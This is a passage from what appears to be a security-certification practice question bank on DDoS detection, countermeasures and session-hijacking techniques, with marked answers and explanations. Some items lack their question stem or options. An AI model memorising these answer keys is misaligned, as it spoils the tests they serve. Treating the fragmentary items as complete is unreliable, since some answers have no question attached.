+ [x] Wavelet-based signal analysis
+ [ ] Activity profiling
+ [ ] Change-point detection
> **Explanation:**
> + The correct answer is “Wavelet-based signal analysis” because this technique divides the signal in spectral components and analyzes it. The wavelet analysis technique analyzes network traffic in terms of spectral components. It divides incoming signals into various frequencies and analyzes different frequency components separately. Analyzing each spectral window’s energy determines the presence of anomalies. These techniques check frequency components present at a specific time and provide a description of those components. Presence of an unfamiliar frequency indicates suspicious network activity.
> + It is not activity profiling technique since this technique monitors the network’s packet header information and identifies increase in specific type of traffic.
> + Change-point detection technique filters network traffic by IP addresses, targeted port numbers, and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate versus time.
> + NetFlow detection could be a part of activity profiling, but it is not used as a self-contained DDoS detection technique.

+ [x] Deflect attacks
+ [ ] Mitigate attacks
> **Explanation:**
> + **Deflect Attacks:** In this type counter attacks, honeypots are intentionally set up with low security to gain the attention of DDoS attackers and serve as a means for gaining information about attackers, attack techniques, and tools by storing a record of the system activities.
> + Detect and Neutralize Handlers: An important method used to stop DDoS attacks is to detect and neutralize handlers. This can be achieved by network traffic analysis, neutralizing botnet handlers, and identifying spoofed source addresses.
> + Mitigate Attacks: Load Balancing, Throttling, and Drop Requests techniques are used as a part of defense.
> + Prevent Potential Attacks: Egress Filtering, Ingress Filtering, TCP Intercept, and Rate limiting techniques are used for the defense.

701. Which of the following best practices should be followed to thwart DoS/DDoS attacks?
+ [x] Block all inbound packets originating from the service ports

702. Which of the following techniques can be used to prevent a botnet attack?
+ [ ] Physical security
+ [ ] Information gathering
+ [x] Black hole filtering
+ [ ] Port scanning
> **Explanation:**
> Black hole filtering is used to discard packets at the routing level; especially suspicious malicious packets such asDDoS.Port scanning cannot prevent a botnet attack. Information gathering is part of footprinting and cannot prevent botnet attack. Physical security cannot prevent botnet attacks.

703. Which of the following is an attack detection technique that monitors the network packet’s header information? This technique also determines the increase in overall number of distinct clusters and activity levels among the network flow clusters?
+ [x] Activity profiling
+ [ ] Wavelet-based signal analysis
+ [ ] Sequential change-point detection
+ [ ] Ping of death attack
> **Explanation:**
> + Activity profiling is done based on the average packet rate for a network flow, which consists of consecutive packets with similar packet header information. Packet header information includes the destination and sender IP addresses, ports, and transport protocols used.
> + Wavelet-based signal analysis denotes an input signal in terms of spectral components. Sequential change-point detection can be used to identify the typical scanning activities of network worms. Ping of death attack is a type of ICMP attack.

704. Ivan works as security consultant at “Ask Us Intl.” One of his clients is under a large-scale protocol-based DDoS attack, and they have to decide how to deal with this issue. They have some DDoS appliances that are currently not configured. They also have a good communication channel with providers, and some of the providers have fast network connections. In an ideal scenario, what would be the best option to deal with this attack. Bear in mind that this is a protocol-based DDoS attack with at least 10 000 bots sending the traffic from the entire globe!
+ [ ] Absorb the attack at the client site
+ [ ] Filter the traffic at the company’s Internet facing routers
+ [ ] Absorb the attack at the provider level
+ [x] Block the traffic at the provider level
> **Explanation:**
> The answer is “Block the traffic at the provider level,” since the provider can easily block specific protocols, thereby effectively preventing traffic to reach the client’s site. Absorbing the traffic is not the answer, since this is not the best solution in this case (provider level or client site). Filtering the traffic at the company’s Internet facing routers is an option, but the best thing to do is to filter the traffic as high as possible, and since in this case, we do have a good communication channel with the provider(s), we will not use the filtering at client site.

705. John’s company is facing a DDoS attack. While analyzing the attack, John has learned that the attack is originating from entire globe and filtering the traffic at the Internet Service Provider’s (ISP) level is an impossible task to do. After a while, John has observed that his personal computer at home was also compromised similar to that of the company’s computers. He observed that his computer is sending large amounts of UDP data directed toward his company’s public IPs.
	John takes his personal computer to work and starts a forensic investigation. Two hours later, he earns crucial information: the infected computer is connecting to the C&C server, and unfortunately, the communication between C&C and the infected computer is encrypted. Therefore, John intentionally lets the infection spread to another machine in his company’s secure network, where he can observe and record all the traffic between the Bot software and the Botnet. After thorough analysis he discovered an interesting thing that the initial process of infection downloaded the malware from an FTP server which consists of username and password in cleartext format. John connects to the FTP Server and finds the Botnet software including the C&C on it, with username and password for C&C in configuration file. What can John do with this information?
	After successfully stopping the attack against his network, John connects to the C&C again, dumps all the IPs the C&C is managing, and sends this information to the national CERT. What is John trying to do?

706. Sarah is facing one of the biggest challenges in her career—she has to design the early warning DDoS detection techniques for her employer. She starts with the network analysis and detection of an increase in activity levels and analyzing the network flows (focusing on network’s packet header information). Her idea is to try to spot the increase in specific traffic, which is above normal traffic rate for this specific network flow. Which DDoS detection technique is she trying to implement?
+ [ ] NetFlow detection
+ [ ] Wavelet-based signal analysis
+ [ ] Change-point detection
+ [x] Activity profiling
> **Explanation:**
> + The correct answer is “Activity profiling,” since the technique that Sarah is trying to implement is to monitor the network packet header information and identify any increase in traffic. The higher a flow’s average packet rate or activity level, the less time there is between consecutive matching packets. Randomness in average packet rate or activity level can indicate suspicious activity. The entropy calculation method of activity profiling measures randomness in activity levels. If the network is under attack, entropy of network activity levels will increase.
> + Change-point detection technique filters network traffic by IP addresses, targeted port numbers, and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate versus time.
> + The wavelet analysis technique analyzes network traffic in terms of spectral components. It divides incoming signals into various frequencies and analyzes different frequency components separately. Analyzing each spectral window’s energy determines the presence of anomalies.
> + NetFlow detection could be a part of activity profiling, but it is not used as a self-contained DDoS detection technique.

707. Which of the following practices can make the organization’s network vulnerable to DoS/DDoS attacks?
+ [x] Do not perform extensive simulations of DoS/DDoS attacks to avoid sudden surges
+ [ ] Enable TCP SYN cookie protection
+ [ ] Update the kernel to the latest release and disable unused and insecure services
+ [ ] Block all inbound packets originating from the service ports to block traffic from reflection servers
> **Explanation:**
> The following is a list of countermeasures for combating DoS/DDoS attacks:
> + Enable TCP SYN cookie protection.
> + Block all inbound packets originating from the service ports to block traffic from reflection servers.
> + **Perform extensive simulations of DoS/DDoS attacks to avoid sudden surges and maintain a proper counteraction strategy for future attacks.**
> + Update the kernel to the latest release and disable unused and insecure services.
> + Use strong encryption mechanisms such as WPA2 and AES 256 for broadband networks to defend against eavesdropping.

708. Which of the following techniques is a basic access-control list (ACL) filter that limits the impact of DDoS attacks by blocking traffic with spoofed addresses?
+ [ ] Cisco IPS source IP reputation filtering
+ [ ] Black-hole filtering
+ [x] RFC 3704 filtering
+ [ ] DDoS prevention offerings from ISP or DDoS service
> **Explanation:**
> + Cisco IPS Source IP Reputation Filtering: Reputation services help in determining if an IP or service is a source of threat.
> + Black Hole Filtering: Black hole filtering refers to discarding packets at the routing level.
> + **RFC 3704 Filtering**: RFC 3704 is a basic access-control list (ACL) filter, which limits the impact of DDoS attacks by blocking traffic with spoofed addresses.
> + DDoS Prevention Offerings from ISP or DDoS Service: Enable IP Source Guard (in CISCO) or similar features in other routers to filter traffic based on the DHCP snooping binding database or IP source bindings, preventing a bot from succeeding with spoofed packets.

709. Which of the following DoS/DDoS countermeasures strategy can you implement using a honeypot?
+ [ ] Absorbing attacks
+ [x] Deflecting attacks
+ [ ] Degrading services
+ [ ] Mitigating attacks
> **Explanation:**
> Honeypots are intentionally set up with low security to gain the attention of the DDoS attackers. A honeypot attracts DDoS attackers, in that they will install handlers or agent code within the honeypot. This avoids compromising of more sensitive systems. Honeypots not only protect the actual system from attackers but also keep track of details about what the attackers are doing by storing the information in a record. This gives the owner of the honeypot a way to keep a record of handler and agent activity. Users can use this knowledge to defend against any future DDoS attacks.

710. Ivan works as security consultant at “Ask Us Intl.” One of his clients is under a large-scale application layer-based DDoS attack, and they have to decide how to deal with this issue. Web application under attack is being used to send the user filled forms and save the data in MySQL database. Since the DDoS is abusing POST functionality, not only web application and web server are in DDoS condition but also MySQL database is in DDoS condition.
	They have some DDoS appliances that are currently not configured. They also have good communication channel with providers, and some of the providers have fast network connections. In an ideal scenario, what would be the best option to deal with this attack. Bear in mind that this is an application layer-based DDoS attack which sends at least 1000 malicious POST requests per second spread through the entire globe!
+ [ ] Absorb the attack at the provider level
+ [ ] Filter the traffic at the company’s Internet facing routers
+ [x] Use CAPTCHA
+ [ ] Absorb the attack at the client site
> **Explanation:**
> The answer is “Use CAPTCHA.” CAPTCHA is a challenge-response type test implemented by the web applications to ensure whether the response is generated by the computer or not. By using strong CAPTCHAs (assuming the CAPTCHA is not easily solvable in code), 1000 malicious POSTs per second will be effectively blocked. The answer is not absorbing the traffic, since this is not the best solution in this case (provider level or client site) because it is difficult to separate malicious from legitimate traffic. Filtering the traffic at the company’s Internet facing routers is not an option because it is difficult to separate malicious from legitimate traffic.

711. Which of the following botnet defending techniques involves discarding packets at the routing level?
+ [ ] RFC 3704 filtering
+ [ ] Cisco IPS source IP reputation filtering
+ [ ] DDoS prevention offerings from ISP or DDoS service
+ [x] Black-hole filtering
> **Explanation:**
> + Cisco IPS Source IP Reputation Filtering: Reputation services help in determining if an IP or service is a source of threat.
> + **Black Hole Filtering:** A “black hole” refers to a network node where incoming traffic is discarded or dropped without informing the source that the data did not reach its intended recipient Black hole filtering refers to discarding packets at the routing level.
> + DDoS Prevention Offerings from ISP or DDoS Service: Enable IP Source Guard (in CISCO) or similar features in other routers to filter traffic based on the DHCP snooping binding database or IP source bindings, preventing a bot from succeeding with spoofed packets.
> + RFC 3704 Filtering: RFC 3704 filtering limits the impact of DDoS attacks by denying traffic with spoofed addresses.

712. Which of the following DoS/DDoS detection techniques isolates the changes in the network traffic statistics and traffic flow rate that are caused by attacks?
+ [x] Sequential change-point detection
+ [ ] Absorbing the attack
+ [ ] Wavelet-based signal analysis
+ [ ] Activity profiling
> **Explanation:**
> + Activity Profiling: Activity profiling is performed based on the average packet rate for network flow, which consists of consecutive packets with similar packet header information.
> + Wavelet-Based Signal Analysis: The wavelet analysis technique analyzes network traffic in terms of spectral components. It divides incoming signals into various frequencies and analyzes different frequency components separately.
> + **Sequential Change-Point Detection**: Change-point detection algorithms isolate changes in network traffic statistics and in the traffic flow rate caused by attacks.
> + Absorbing the Attack: It is DoS/DDoS countermeasure strategy, in which additional capacity is used to absorb an attack, which requires preplanning. It also requires additional resources.

# 11. Session Hijacking
## Session Hijacking Concepts
715. In which of the following levels of the OSI model does an attacker gain control over the HTTP user session and create new unauthorized sessions by using the stolen data?
+ [ ] Transport level
+ [x] Application level
+ [ ] Network level
+ [ ] Presentation level
> **Explanation:**
> There are two levels of session hijacking in the OSI model: the network level and application level.
> + Network Level Hijacking: It is the interception of packets during the transmission between a client and server in a TCP/User Datagram Protocol (UDP) session. A successful attack provides the attacker with crucial information, which can be further used to attack application level sessions. Attackers most likely perform network level hijacking because they do not need to modify the attack on a per-web-application basis. This attack focuses on the data flow of the protocol shared across all web applications.
> + **Application Level Hijacking:** Involves gaining control over the Hypertext Transfer Protocol (HTTP) user session by obtaining the session IDs. At the application level, the attacker gains control of an existing session and can create new unauthorized sessions by using stolen data. In general, both occur together, depending on the system being attacked.
> + A Presentation Level and Transport Level no hijacking takes place.

716. In which of the following attacks does an attacker seize control of a valid TCP communication session between two computers and gain access to a machine while a session is in progress?
+ [ ] Client-side attack
+ [x] Session hijacking
+ [ ] Brute forcing
+ [ ] Spoofing attack
> **Explanation:**
> + Client-Side Attack: Client-side attacks target vulnerabilities in client applications that interact with a malicious server or process malicious data. Depending on the nature of vulnerabilities, an attacker can exploit an application by sending an email with a malicious link or otherwise tricking a user into visiting a malicious website.
> + Spoofing Attack: An attacker pretends to be another user or machine (victim) to gain access. The attacker does not seize control of an existing active session; instead, he or she initiates a new session using the victim’s stolen credentials.
> + Brute forcing: In the brute-force technique, an attacker obtains session IDs by attempting all possible permutations of session ID values until finding one that works. An attacker using a digital subscriber line (DSL) can generate up to 1,000 session IDs per second. This technique is most useful when the algorithm that produces session IDs is non-random.
> + **Session Hijacking:** Session hijacking is an attack in which an attacker takes over a valid Transmission Control Protocol (TCP) communication session between two computers. Because most types of authentication are performed only at the start of a TCP session, an attacker can gain access to a machine while a session is in progress. Attackers can sniff all the traffic from established TCP sessions and perform identity theft, information theft, fraud, etc.

717. Which of the following is considered to be a session hijacking attack?
+ [x] Taking over a TCP session
+ [ ] Monitoring a UDP session
+ [ ] Taking over a UDP session
+ [ ] Monitoring a TCP session
> **Explanation:**
> Taking over a TCP session is one of the most common session hijacking sessions and is the correct answer. All other options are not correct.

718. An attacker is using session hijacking on the victim system to perform further exploitation on the target network. Identify the type of attacks an attacker can perform using session hijacking?
+ [ ] Piggybacking
+ [ ] Tailgating
+ [ ] Dumpster Diving
+ [x] Sniffing
> **Explanation:**
> + **Sniffing**: It is a process of monitoring and capturing all data packets passing through a given network by using a software application or a hardware device
> + Piggybacking: It usually implies entry into the building or security area with the consent of the authorized person.
> + Dumpster Diving: It is the process of retrieving sensitive personal or organizational information by searching through trash bins.
> + Tailgating: It implies access to a building or secured area without the consent of the authorized person.

719. During a penetration test, Marin exploited a blind SQLi and exfiltrated session tokens from the database. What can he do with this data?
+ [ ] Marin can do CSRF (Cross-Site Request Forgery)
+ [x] Marin can do Session Hijacking
+ [ ] Marin can do XSS (Cross-Site Scripting)
+ [ ] Marin can do SQLi (SQL injection)
> **Explanation:**
> + The correct answer is that Marin can do a Session Hijacking attack, by using the session IDs. A session hijacking attack refers to the exploitation of a session-token generation mechanism or token security controls so that the attacker can establish an unauthorized connection with a target server.
> + He would have used SQLi for the initial exfiltration of the session data.
> + He could use XSS in another scenario to steal the session data, but he already has it.
> + CSRF is not applicable to this scenario, since it requires user interaction or active XSS attack.

720. When a person (or software) steals, can calculate, or can guess part of the communication channel between client and the server application or protocols used in the communication, he can hijack the ______.
+ [ ] TCP protocol
+ [ ] UDP protocol
+ [x] Session
+ [ ] Channel
> **Explanation:**
> The correct answer is session (session hijacking). Channel hijacking is not the correct term used for this and TCP/UDP protocol hijacking is just a subset of the answer.

721. Until a few years ago, most of the web sites (including highly exposed ones like Facebook, Twitter, Gmail) used a secure (https) connection only during the logon process, after which they switched back to insecure (http) connection. One of the tools FireSheep exploited this behavior in order to steal user session and effectively educate the public that a secure connection was required to be used from the first to the last packet of connection. The attack this tool was using is called________________________
+ [ ] Session splicing
+ [ ] Session duplicating
+ [ ] Session piggybacking
+ [x] Session hijacking
> **Explanation:**
> + The correct answer is Session hijacking since steal user session is a part of Session hijacking attack.
> + Session splicing represents IDS evasion technique
> + Session duplicating and session piggybacking are not correct terms for this. They are the end-result of application session hijacking.

722. In which of the following session hijacking phases does an attacker break the connection to a victim’s machine with knowledge of the next sequence number (NSN)?
+ [x] Session desynchronization
+ [ ] Monitor
+ [ ] Command injection
+ [ ] Session ID prediction
> **Explanation:**
> + Monitor: Monitor the flow of packets and predict the sequence number
> + **Session Desynchronization**: Break the connection to the victim’s machine. It is easy to accomplish this attack if the attacker knows the next sequence number (NSN) used by the client. A session can be hijacked by using that sequence number before the client uses it.
> + Session ID Prediction: Take over the session
> + Command Injection: Start injecting packets to the target server

723. In one of the following attacks, an attacker pretends to be another user to gain access without seizing control of an existing active session; instead, the attacker initiates a new session using the victim’s stolen credentials. Which is this attack?
+ [ ] Brute forcing
+ [ ] Session sniffing
+ [x] Spoofing attack
+ [ ] Session hijacking
> **Explanation:**
> + Session Sniffing: A web server identifies a user’s connection through a unique session ID (also known as a session token). The web server sends a session token to the client browser after the successful authentication of client login. Usually, a session token comprises a string of variable width that is useful in various ways, such as in the header of an HTTP requisition (cookie), in a URL, or in the body of an HTTP requisition.
> + **Spoofing Attack**: An attacker pretends to be another user or machine (victim) to gain access. The attacker does not seize control of an existing active session; instead, he or she initiates a new session using the victim’s stolen credentials
> + Brute Forcing: In the brute-force technique, an attacker obtains session IDs by attempting all possible permutations of session ID values until finding one that works. An attacker using a digital subscriber line (DSL) can generate up to 1,000 session IDs per second. This technique is most useful when the algorithm that produces session IDs is non-random.
> + Session Hijacking: Session hijacking is an attack in which an attacker takes over a valid Transmission Control Protocol (TCP) communication session between two computers. Because most types of authentication are performed only at the start of a TCP session, an attacker can gain access to a machine while a session is in progress. Attackers can sniff all the traffic from established TCP sessions and perform identity theft, information theft, fraud, etc.


## Application Level Session Hijacking
724. Which of the following techniques is used to compromise session IDs, with an attacker intruding into an existing connection between systems and attempting to intercept the messages being transmitted?
+ [ ] Man-in-the-browser attack
+ [ ] Client-side attack
+ [ ] Fragmentation attack
+ [x] Man-in-the-middle attack
> **Explanation:**
> + **Man-in-the-Middle Attack**: A man-in-the-middle (MITM) attack is used to intrude into an existing connection between systems and to intercept messages being transmitted. In this attack, attackers use different techniques and split a TCP connection into two: a client-to-attacker connection and an attacker-to-server connection.
> + Fragmentation Attack: These attacks destroy a victim’s ability to reassemble fragmented packets by flooding it with TCP or UDP fragments, resulting in reduced performance. In fragmentation attacks, the attacker sends a large number of fragmented (1500+ byte) packets to a target web server with a relatively small packet rate.
> + Man-in-the-Browser Attack: A man-in-the-browser attack is similar to an MITM attack. The difference between the two is that a man-in-the-browser attack uses a Trojan horse to intercept and manipulate calls between a browser and its security mechanisms or libraries. An attacker positions a previously installed Trojan between the browser and its security mechanism, and the Trojan can modify web pages and transaction content or insert additional transactions. All of the Trojan’s activities are invisible to both the user and web application.
> + Client-side Attack: Client-side attacks target vulnerabilities in client applications that interact with a malicious server or process malicious data. Depending on the nature of vulnerabilities, an attacker can exploit an application by sending an email with a malicious link or otherwise tricking a user into visiting a malicious website.

725. Which of the following attack techniques allows an attacker to inject malicious client-side scripts into web pages viewed by other users?
+ [ ] Trojans
+ [ ] Malicious JavaScript
+ [x] XSS
+ [ ] CSRF
> **Explanation:**
> + Malicious JavaScript: A malicious script can be embedded in a web page that does not generate any warning, but it captures session tokens in the background and sends them to the attacker.
> + **XSS**: XSS enables attackers to inject malicious client-side scripts into the web pages viewed by other users.
> + Trojans: A Trojan horse can change the proxy settings in the user’s browser to send all the sessions through the attacker’s machine.
> + CSRF: Cross-site request forgery (CSRF), also known as a one-click attack or session riding, is an attack in which the attacker exploits the victim’s active session with a trusted site to perform malicious activities such as item purchases and the modification or retrieval of account information.

726. Which of the following attacks exploits the reuse of cryptographic nonce during the TLS handshake to hijack HTTPS sessions, leading to the disclosure of sensitive information?
+ [ ] Session donation attack
+ [ ] Proxy servers
+ [ ] CRIME attack
+ [x] Forbidden attack
> **Explanation:**
> + CRIME Attack: Compression Ratio Info-Leak Made Easy (CRIME) is a client-side attack that exploits the vulnerabilities present in the data compression feature of protocols, such as SSL/TLS, SPDY, and HTTPS. Attackers hijack the session by decrypting secret session cookies. The authentication information obtained from the session cookies is used to establish a new session with the web application
> + Proxy Servers: An attacker lures the victim to click on a bogus link, which looks legitimate but redirects the user to the attacker server. The attacker forwards the request to the legitimate server on behalf of the victim and serves as a proxy for the entire transaction. The attacker then captures the session’s information during the interaction of the legitimate server and user
> + Session Donation Attack: In a session donation attack, an attacker donates his/her own session identifier (SID) to the target user. The attacker first obtains a valid SID by logging into a service and later feeds the same SID to the target user. This SID links a target user back to the attacker’s account page without any information to the victim
> + **Forbidden Attack:** A forbidden attack is a type of man-in-the-middle attack used to hijack HTTPS sessions. It exploits the reuse of cryptographic nonce during the TLS handshake. After hijacking the HTTPS session, the attackers inject malicious code and forged content that prompts the victim to disclose sensitive information, such as bank account numbers, passwords, and social security numbers

727. In one of the following attacks, an attacker exploits the vulnerabilities present in the data compression feature of protocols, such as SSL/TLS, SPDY, and HTTPS, and hijacks the session by decrypting secret session cookies. Which is this attack?
+ [ ] Forbidden attack
+ [ ] Proxy servers
+ [ ] Session donation attack
+ [x] CRIME attack

> + Forbidden Attack: A forbidden attack is a type of man-in-the-middle attack used to hijack HTTPS sessions. It exploits the reuse of cryptographic nonce during the TLS handshake. After hijacking the HTTPS session, the attackers inject malicious code and forged content that prompts the victim to disclose sensitive information, such as bank account numbers, passwords, and social security numbers

728. In which of the following techniques does an attacker obtain session IDs by attempting all possible permutations of session ID values until finding one that works?
+ [ ] Session hijacking
+ [ ] Guessing
+ [x] Brute forcing
+ [ ] Stealing
> **Explanation:**
> + Stealing: Attackers use different techniques to steal session IDs. An attacker can steal the session key through physical access by, for example, acquiring the files containing session IDs or memory contents of either the user’s system or the server. The attacker can also use sniffing tools such as Wireshark or SteelCentral Packet Analyzer to sniff the traffic between the client and server to extract the session IDs from the packets.
> + Guessing: An attacker attempts to guess the session IDs by observing session variables. In the case of session hijacking, the range of session ID values that can be guessed is limited. Thus, guessing techniques are effective only when servers use weak or flawed session-ID generation mechanisms
> + **Brute forcing**: In the brute-force technique, an attacker obtains session IDs by attempting all possible permutations of session ID values until finding one that works. An attacker using a digital subscriber line (DSL) can generate up to 1,000 session IDs per second. This technique is most useful when the algorithm that produces session IDs is non-random.
> + Session Hijacking: Session hijacking is an attack in which an attacker takes over a valid Transmission Control Protocol (TCP) communication session between two computers.

Attackers can sniff all the traffic from established TCP sessions and perform identity theft, information theft, fraud, etc.

729. Which of the following is the phase of a session fixation attack wherein an attacker waits for a victim to login to a target web server using a trap session ID and then enters the victim’s session?
+ [ ] Fixation
+ [ ] Session set-up
+ [x] Entrance
+ [ ] Brute forcing
> **Explanation:**
> A session fixation attack has the following three phases:
> + Session set-up phase: In this phase, the attacker first obtains a legitimate session ID by establishing a connection with the target web server. Few web servers support the idle session time-out feature. If the target web server supports this feature, the attacker needs to send requests repeatedly to keep the established trap session ID alive.
> + Fixation phase: In this phase, the attacker introduces the session ID to the victim's browser, thereby fixing the session.
> + **Entrance phase**: In this phase, the attacker waits for the victim to log in to the target web server using the trap session ID and then enters the victim’s session.
> + Brute forcing: In the brute-force technique, an attacker obtains session IDs by attempting all possible permutations of session ID values until finding one that works.

730. In one of the following attacks, an attacker captures the authentication token of a user by listening to a conversation between the user and server and reiterates the authentication request to the server with the captured authentication token to gain unauthorized access to the server. Which is this attack?
+ [ ] CRIME attack
+ [ ] Cross-site request forgery attack
+ [x] Session replay attack
+ [ ] Forbidden attack
> **Explanation:**
> + **Session Replay Attacks**: In a session replay attack, the attacker captures the authentication token of a user by listening to a conversation between the user and server. Once the authentication token is captured, the attacker replays the authentication request to the server with the captured authentication token to dodge the server; consequently, they gain unauthorized access to the server
> + Cross-site Request Forgery Attack: Cross-site request forgery (CSRF), also known as a one-click attack or session riding, is an attack in which the attacker exploits the victim’s active session with a trusted site to perform malicious activities such as item purchases and the modification or retrieval of account information

731. During a penetration test, Marin identified a web application that could be exploited to gain a root shell on the remote machine. The only problem was that in order to do that he would have to know at least one valid username and password that could be used in the application. Unfortunately, guessing usernames and brute-forcing passwords did not work. Marin does not want to give up his attempts. Since this web application is being used by almost all users in the company, and moreover it was using the http protocol, so he decided to use the Cain & Abel tool in order to identify at least one username and password. Marin found that the network was using layer 2 switches with no configuration or management features.
	Which of the following attack will help Marin to do this?
+ [ ] Cross-site Scripting attack
+ [ ] DoS attack
+ [ ] MitB (Man in the Browser)
+ [x] MitM (Man in the Middle)
> **Explanation:**
> The correct answer is MitM (Man in the Middle). Since the network was using layer 2 switches with no configuration or management features, Marin can sniff the network and capture the required details from the network traffic using Cain and Abel tool. MitB (Man in the Browser) is not the correct answer because it is used in attacks where the attacker has access to the user computer.

732. MitB (Man in the Browser) is a session hijacking technique heavily used by e-banking Trojans. The most popular ones are Zeus and Gameover Zeus. Explain how MitB attack works.
+ [x] Malware is injected between the browser and OS API, enabling to see the data before encryption (when data is sent from the machine) and after decryption (when data is being received by the machine)
+ [ ] Malware is injected between the browser and network.dll, enabling to see the data before it is sent to the network and while it is being received from the network
+ [ ] Man-in-the-Browser is just another name for sslstrip MitM attack
+ [ ] Malware is injected between the browser and keyboard driver, enabling to see all the keystrokes
> **Explanation:**
> On Windows OS, malware is injected between the browser and wininet.dll, which allows it to see the data before encryption (wininet.dll is exposing APIs to use https etc.)

733. Marin is performing penetration testing on the target organization. He discovered some vulnerabilities in the organization’s website. He decided to insert malicious JavaScript code into a vulnerable dynamic web page to collect information such as credentials, cookies, etc. Identify the attack performed by Marin?
+ [ ] Man-in-the-Browser Attack
+ [ ] Cross-site Request Forgery Attack
+ [x] Cross-site Scripting Attack
+ [ ] Session Replay Attack
> **Explanation:**
> This is XSS attack and it will send session cookie to the remote IP in the parameter, giving the attacker active users session.
> + **Cross-Site Scripting Attack:** A cross-site script attack is a client-side attack in which the attacker compromises the session token by making use of malicious code or programs. This type of attack occurs when a dynamic Web page gets malicious data from the attacker and executes it on the user’s system. Websites that create dynamic pages do not have control over how the clients read their output. Thus, attackers can insert a malicious JavaScript, VBScript, ActiveX, HTML, or Flash applet into a vulnerable dynamic page. That page will then execute the script on the user’s machine and collect personal information of the user, steal cookies, redirect users to unexpected Web pages, or execute any malicious code on the user’s system.
> + Cross-site Request Forgery Attack: Cross-site Request Forgery (CSRF), also known as a one-click attack or session riding, exploits victim’s active session with a trusted site to perform malicious activities such as purchase an item, modify, or retrieve account information. In CSRF web attacks, an attacker forces the victim to submit the attacker’s form data to the victim’s Web server. The attacker creates the host form, containing malicious information, and sends it to the authorized user. The user fills in the form and sends it to the server. Because the data is coming from a trusted user, the Web server accepts the data.
> + Session Replay Attack: In a session replay attack, the attacker listens to the conversation between the user and the server and captures the authentication token of the user. Once the authentication token is captured, the attacker replays the request to the server with the captured authentication token to dodge the server and gains unauthorized access to the server.
> + Man-in-the-Browser Attack: A man-in-the-browser attack is similar to that of a man-in-the-middle attack. The difference between the two techniques is that the man-in-the-browser attack uses a Trojan horse to intercept and manipulate calls between the browser and its security mechanisms or libraries. An attacker uses previously installed Trojan to act between the browser and its security mechanism, capable of modifying web pages, and modifying transaction content or inserting additional transactions, everything invisible to both the user and web application.

+ [ ] Cross-site script attack
> **Explanation:**
> + **Cross-site Request Forgery Attack**: Cross-site request forgery (CSRF), also known as a one-click attack or session riding, is an attack in which the attacker exploits the victim’s active session with a trusted site to perform malicious activities such as item purchases and the modification or retrieval of account information.
> + Cross-site Script Attack: If an attacker sends a crafted link to the victim with malicious JavaScript, the JavaScript will run and complete the instructions made by the attacker when the victim clicks on the link
> + Session Replay Attacks: In a session replay attack, the attacker listens to the conversation between the user and the server and captures the authentication token of the user. Once the authentication token is captured, the attacker replays the request to the server with the captured authentication token and gains unauthorized access to the server
> + Session Fixation: Session fixation is an attack that allows an attacker to hijack a valid user session. An attacker attempts to lure a user to authenticate himself or herself with a known session ID and then hijacks the user-validated session with the knowledge of the used session ID.

735. Which of the following is a client-side attack where an attacker changes the proxy settings in the user’s browser to send all the sessions via the attacker’s machine?
+ [ ] Cross-site scripting (XSS)
+ [ ] Man-in-the-middle attack
+ [ ] Malicious JavaScript codes
+ [x] Trojans
> **Explanation:**
> + Cross-site Scripting (XSS): XSS enables attackers to inject malicious client-side scripts into web pages viewed by other users
> + Malicious JavaScript Codes: An attacker can embed in a web page a malicious script that does not generate any warning but captures session tokens in the background and sends them to the attacker
> + **Trojans**: A Trojan horse can change the proxy settings in the user’s browser to send all sessions through an attacker’s machine
> + Man-in-the-Middle Attack: A man-in-the-middle (MITM) attack is used to intrude into an existing connection between systems and to intercept messages being transmitted. In this attack, attackers use different techniques and split a TCP connection into two: a client-to-attacker connection and an attacker-to-server connection

736. A session hijacking attack that gains control over the HTTP’s user session by obtaining the session IDs, is known as_______________
+ [x] Application level hijacking
+ [ ] Passive attack
+ [ ] Network level hijacking
+ [ ] Active hijacking
> **Explanation:**
> Application Level Hijacking invokes gaining control over HTTP’s user session by obtaining the session IDs. Network level hijacking invokes the interception of the packets during transmission in a TCP and UDP session between a server and client communication. Active and Passive attacks options are incorrect.

737. During a penetration test, Marin discovered that a web application does not change the session cookie after successful login. Instead, the cookie stays the same and is allowed additional privileges. This vulnerability and application-level session hijacking is called ______________.
+ [ ] Predictable session token
+ [x] Session fixation
+ [ ] Session sniffing
+ [ ] Session replay attack
> **Explanation:**
> Session fixation is the correct answer. It is the vulnerability where the user can connect to the server, receive the cookie, and then try to use this cookie in social engineering or some other attack, provoking the user to login. When the user logs in, the session becomes active and the attacker has access to the user session even without knowing the username and password.


## Network Level Session Hijacking
738. In which of the following technique does an attacker use spoofed packets to seize control of a connection between a victim and target machine on the same network as the victim?
+ [ ] Forced ARP entry
+ [x] TCP/IP hijacking
+ [ ] HTTP Public Key Pinning
+ [ ] Blind hijacking
> **Explanation:**
> + **TCP/IP hijacking:** It involves using spoofed packets to seize control of a connection between a victim and target machine. A victim's connection hangs, and an attacker is then able to communicate with the host’s machine as if the attacker is the victim. To launch a TCP/IP hijacking attack, the attacker must be on the same network as the victim. The target server and the victim machines can be located anywhere
> + HTTP Public Key Pinning: This technique is used in an HTTP header that allows a web client to associate a specific public key certificate with a particular server to minimize the risk of MITM attacks based on fraudulent certificates.
> + Blind Hijacking: An attacker can inject malicious data or commands into the intercepted communications in the TCP session even if the source-routing is disabled. The attacker can send the data or commands but has no access to see the response
> + Forced ARP Entry: A forced ARP entry involves replacing the MAC address of a compromised machine in the ARP cache of the server with a different one in order to restrict network traffic to the compromised machine.

739. In which of the following types of hijacking can an attacker inject malicious data or commands into intercepted communications in a TCP session, even if the victim disables source routing?
+ [ ] RST hijacking
+ [ ] UDP hijacking
+ [x] Blind hijacking
+ [ ] Session fixation
> **Explanation:**
> + RST Hijacking: RST hijacking involves injecting an authentic-looking reset (RST) packet by using a spoofed source IP address and predicting the acknowledgment number. The hacker can reset the victim’s connection if it uses an accurate acknowledgment number. The victim believes that the source has sent the reset packet and resets the connection.
> + **Blind Hijacking**: In blind hijacking, an attacker can inject malicious data or commands into intercepted communications in a TCP session, even if the victim disables source routing. For this purpose, the attacker must correctly guess the next ISN of a computer attempting to establish a connection. Although the attacker can send malicious data or a command, such as a password setting to allow access from another location on the network, the attacker cannot view the response.
> + UDP Hijacking: The User Datagram Protocol (UDP) does not use packet sequencing or synchronizing. Therefore, a UDP session can be attacked more easily than a TCP session. Because UDP is connectionless, it is easy to modify data without the victim noticing. In network level session hijack, the hijacker forges a server reply to a client UDP request before the server can respond
